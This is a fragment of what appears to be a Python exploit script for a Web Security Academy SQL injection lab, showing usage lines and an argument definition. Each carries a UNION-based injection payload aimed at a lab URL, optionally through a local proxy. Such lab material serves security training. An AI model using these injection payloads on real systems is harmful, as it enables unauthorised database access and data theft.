...
Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT NULL,'f1KkGv',NULL--" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT NULL,'f1KkGv',NULL--" 
...
parser.add_argument('-c', '--command', help='Command to run, Example: \' UNION SELECT NULL,\'f1KkGv\',NULL--', required=True)
